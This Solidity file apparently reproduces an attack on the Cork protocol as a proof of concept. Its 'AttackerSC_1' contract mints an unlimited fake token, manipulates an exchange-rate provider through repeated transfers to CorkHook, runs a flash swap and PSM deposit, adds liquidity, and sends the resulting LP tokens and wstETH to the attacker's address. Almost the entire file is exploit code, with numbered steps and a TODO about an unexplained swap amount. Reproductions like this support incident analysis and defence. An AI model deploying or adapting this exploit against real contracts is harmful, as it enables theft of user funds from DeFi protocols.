// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Interfaces.sol";
import "forge-std/console.sol";

// Attacker's Smart Contract 1
contract AttackerSC_1 {
    IMyToken public mtk;
    IERC20 public wstETH;
    IERC20 public weETH5CT;
    ICorkHook corkHook;
    IPSMProxy psmProxy;
    IPSMProxy flashSwapProxy;
    IExchangeRateProvider exchangeRateProvider;

    address attacker_EOA;

    bytes32 internal constant PAIR_ID_FOR_RATE =
        0x6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a;

    constructor(
        address _mtk,
        address _wstETH,
        address _weETH5CT,
        address _corkHook,
        address _psmProxy,
        address _flashSwapProxy,
        address _rateProvider
    ) {
        mtk = IMyToken(_mtk);
        wstETH = IERC20(_wstETH);
        weETH5CT = IERC20(_weETH5CT);
        corkHook = ICorkHook(_corkHook);
        psmProxy = IPSMProxy(_psmProxy);
        flashSwapProxy = IPSMProxy(_flashSwapProxy);
        exchangeRateProvider = IExchangeRateProvider(_rateProvider);
        attacker_EOA = msg.sender;
    }

    function attack() external {
        require(msg.sender == attacker_EOA, "not attacker_EOA");
        // Step 1.2. Get type(uint256).max MTKs to AttSC_1
        mtk.mint(address(this), type(uint256).max);

        // Step 1.3. Approve CorkHook to spend all AttSC_1 MTK's
        mtk.approve(address(corkHook), type(uint256).max);

        // Step 1.4. Transfer sequentially 0, 1e18, 2e18, ... , 9e18 to CorkHook, scoping the rate in between
        for (uint256 i = 0; i <= 9; i++) {
            mtk.transfer(address(corkHook), i * 1e18);
            exchangeRateProvider.rate(PAIR_ID_FOR_RATE); // Step 1.4.1
                // probably some validations/accepted threshold check is made here to break the loop
        }

        // Step 1.5. lidoWstETH.transferFrom sender (exploiter EOA) to AttSC_1 the sum of 10e18
        IERC20(wstETH).transferFrom(attacker_EOA, address(this), 10e18);

        // Step 1.6. Approve wstETH to Cork's Proxy and call swapRaforDs
        wstETH.approve(address(flashSwapProxy), type(uint256).max);

        // Standard default values
        IPSMProxy.BuyAprroxParams memory buyParams;
        buyParams.maxApproxIter = 256;
        buyParams.feeIntervalAdjustment = 1e21;
        buyParams.epsilon = 1e9;
        buyParams.feeEpsilon = 1e9;
        buyParams.precisionBufferPercentage = 1e16;

        // Sending an empty guess, incurrs in greater gas expenses. The attacker made some guesses.
        IPSMProxy.OffchainGuess memory offchainGuess;
        // offchainGuess.initialBorrowAmount = 2_035_043_806_577_874_200;
        // offchainGuess.afterSoldBorrowAmount = 2_554_953_564_824_393_000;

        // TODO: We need to identify how the attacker calculated the amount
        flashSwapProxy.swapRaforDs(PAIR_ID_FOR_RATE, 1, 3_407_593_947_121_416, 0, buyParams, offchainGuess);

        // Step 1.7. Reset wstETH approvals and grant again type(uint256).max to the same Cork's proxy.
        wstETH.approve(address(flashSwapProxy), 0);
        wstETH.approve(address(psmProxy), type(uint256).max);

        console.log("wstETH balance: %s", wstETH.balanceOf(address(this)));

        // Step 1.8. Deposit into proxy's PSM with depositPSM
        psmProxy.depositPSM(PAIR_ID_FOR_RATE, 10e6);

        // Step 1.9. Reset wstETH approval to proxy back to zero, approve wstETH and weETH5CT to CorkHook
        wstETH.approve(address(psmProxy), 0);
        uint256 weBalance = weETH5CT.balanceOf(address(this));

        wstETH.approve(address(corkHook), type(uint256).max);
        weETH5CT.approve(address(corkHook), type(uint256).max);

        // Step 1.10. Call CorkHook.addLiquidity providing wstETH as Ra and weETH5CT as Ct
        corkHook.addLiquidity(address(wstETH), address(weETH5CT), 10e6, weBalance, 0, 0, block.timestamp);

        // Step 1.11. Reset both approvals
        wstETH.approve(address(corkHook), 0);
        weETH5CT.approve(address(corkHook), 0);

        // Step 1.12. Calls the hook and retrieves the liquidity token's address from the ra/ct pair
        address lpTokenAddress = corkHook.getLiquidityToken(address(wstETH), address(weETH5CT));

        IERC20(lpTokenAddress).transfer(attacker_EOA, IERC20(lpTokenAddress).balanceOf(address(this)));
        wstETH.transfer(attacker_EOA, wstETH.balanceOf(address(this)));
    }
}
